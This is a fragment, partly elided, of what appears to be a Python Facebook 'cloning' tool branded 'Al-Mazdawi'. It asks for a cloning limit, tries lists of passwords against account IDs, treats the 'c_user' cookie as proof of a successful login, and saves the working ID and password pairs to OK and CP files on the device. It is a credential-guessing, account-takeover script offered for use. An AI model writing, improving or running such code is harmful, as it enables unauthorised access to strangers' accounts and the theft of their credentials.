...
oks = []
twf = []
os.system('xdg-open https://www.facebook.com/profile.php?id=100089147156284/?ref=share')
os.system('xdg-open https://www.facebook.com/profile.php?id=100089147156284/?ref=share')
...

  ...
  𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊 : A l - M a z d a w i  i
  
  
  
  
  
LIFESTATUS 𖠚  :  Chickens  𖡡 😈🖕🏻
  
  
  
  𝑇𝑂𝑂𝐿 𝑆𝑇𝐴𝑇𝐔𝑆 𖠒 :  Subscriptions  𖥌   
...
def Tabii():
    ...
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mA l - M a z d a w i:👇\033[0;m]")
    print(f"")
    ...
    print(f"          \x1b[97m[\033[37;41m A l - M a z d a w i  \033[0;m]")
    print(f"")
    limit = int(input(' A l - M a z d a w i: 𝟓𝟎𝟎𝟎,𝟏𝟎𝟎𝟎𝟎,𝟐𝟎𝟎𝟎𝟎\n\n 𝐏𝐔𝐓 𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐋𝐈𝐌𝐈𝐓 : '))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/A l - M a z d a w i-𝑂𝐾 .txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/A l - M a z d a w i-𝐂𝐏 .txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[A l - M a z d a w i] [%s]\33[1;97m [𝑂𝐾 :%s~𝐂𝐏 :%s]'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
